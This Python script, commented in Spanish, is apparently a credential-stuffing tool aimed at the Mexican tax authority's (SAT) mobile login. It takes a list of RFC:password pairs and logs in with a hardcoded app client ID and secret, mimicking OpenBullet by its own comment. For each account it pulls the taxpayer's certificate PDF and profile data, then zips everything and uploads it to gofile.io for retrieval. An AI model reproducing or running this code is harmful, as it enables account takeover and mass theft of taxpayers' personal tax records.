import requests
import base64
import os
import zipfile
import re

# Credenciales de la App
C_ID = "fe7bad7c-6dea-4834-8f40-1fa99620613b"
C_SEC = "vhHgI-1N39KVvVK8itaGr7odbrTKnBdbwt4n7PoYHOlo6Fb9pnLXZNWwuGnUj-zijmumfWOGUhlaLer8LACwNA"

def limpiar(s):
    # Elimina basura de codificación (BOM) y caracteres no imprimibles
    return "".join(c for c in s if c.isprintable()).strip()

def run():
    if not os.path.exists("usuarios.txt"): return

    os.makedirs("PDFS_SAT", exist_ok=True)
    reporte = ""
    
    # utf-8-sig mata los "???" del inicio del archivo
    with open("usuarios.txt", "r", encoding="utf-8-sig", errors="ignore") as f:
        lineas = f.readlines()

    for linea in lineas:
        linea = linea.strip()
        if not linea or ":" not in linea: continue
        
        partes = linea.split(":", 1)
        rfc = limpiar(partes[0]).upper()
        pwd = limpiar(partes[1])
        if len(rfc) < 12: continue

        print(f"?? Procesando: {rfc}")

        session = requests.Session()
        
        # 1. TOKEN - CONSTRUCCIÓN MANUAL (IDENTICO A OPENBULLET)
        # No dejamos que Python codifique nada, mandamos la cadena cruda
        full_url = (
            f"https://login.cloudb.sat.gob.mx/nidp/oauth/nam/token?"
            f"grant_type=password&client_id={C_ID}&client_secret={C_SEC}"
            f"&username={rfc}&password={pwd}&scope=satmovil&resourceServer=satmovil"
        )
        
        headers_login = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded"
        }

        try:
            # Forzamos la URL sin que requests la procese (PreparedRequest)
            req = requests.Request('POST', full_url, headers=headers_login, data="")
            prepped = req.prepare()
            # ESTO ES CLAVE: Reemplazamos la URL procesada por nuestra URL original cruda
            prepped.url = full_url 
            
            r_auth = session.send(prepped, timeout=30)
            
            if r_auth.status_code != 200:
                print(f"  [!] Fallo Login: {r_auth.text[:100]}")
                continue
                
            token = r_auth.json().get("access_token")
            if not token: continue

            # 2. PETICIONES DE API (IDENTICAS A TU SCRIPT)
            h_api = {
                "Authorization": f"bearer {token}",
                "User-Agent": "Dart/3.5 (dart:io)",
                "Accept-Encoding": "gzip",
                "Content-Type": "application/json; charset=UTF-8; content=text/html;",
                "Host": "sm-sat-movilzuul-sm-servicios-moviles.cnh.cloudb.sat.gob.mx"
            }

            # DESCARGA PDF
            res_pdf = session.get(f"https://sm-sat-movilzuul-sm-servicios-moviles.cnh.cloudb.sat.gob.mx/satmovil/v1/csf/{rfc}", headers=h_api)
            if res_pdf.status_code == 200:
                js = res_pdf.json()
                if "constancia" in js:
                    with open(f"PDFS_SAT/{rfc}.pdf", "wb") as f_pdf:
                        f_pdf.write(base64.b64decode(js["constancia"]))
                    print(f"  [+] PDF OK")

            # CAPTURA INFO
            res_info = session.get(f"https://sm-sat-movilzuul-sm-servicios-moviles.cnh.cloudb.sat.gob.mx/satmovil/v1/dwh/miinformacion/{rfc}", headers=h_api)
            if res_info.status_code == 200:
                info = res_info.json()
                reporte += f"RFC: {rfc} | NOMBRE: {info.get('tradename')} | STATUS: {info.get('statusDescription')}\n"
                print(f"  [+] INFO OK")

        except Exception as e:
            print(f"  [!] Error: {e}")

    # ZIP Y SUBIDA A GOFILE
    if os.listdir("PDFS_SAT"):
        with open("REPORTE.txt", "w", encoding="utf-8") as f_rep:
            f_rep.write(reporte)
        with zipfile.ZipFile("RESULTADOS.zip", 'w') as z:
            z.write("REPORTE.txt")
            for f in os.listdir("PDFS_SAT"): z.write(f"PDFS_SAT/{f}", f)

        srv = requests.get("https://api.gofile.io/servers").json()["data"]["servers"][0]["name"]
        with open("RESULTADOS.zip", "rb") as fz:
            up = requests.post(f"https://{srv}.gofile.io/contents/uploadfile", files={"file": fz}).json()
        print(f"\n? LINK: {up['data']['downloadPage']}")
    else:
        print("? No se generó nada.")

if __name__ == "__main__":
    run()
